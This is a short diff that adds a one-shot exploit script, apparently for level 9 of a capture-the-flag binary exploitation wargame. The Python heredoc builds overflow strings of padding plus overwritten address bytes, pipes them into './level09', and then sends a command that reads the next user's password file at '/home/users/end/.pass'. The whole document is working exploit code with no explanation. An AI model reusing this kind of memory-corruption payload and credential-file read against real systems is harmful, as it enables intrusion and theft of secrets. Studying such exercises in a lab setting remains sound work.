@@ -1,0 +1,8 @@
+
+python - <<'PY' | ./level09
+import sys
+u = 'a'*40 + '\xd4' + '\n'
+m = 'a'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n'
+c = 'cat /home/users/end/.pass\n'
+print(u + m + c)
+PY
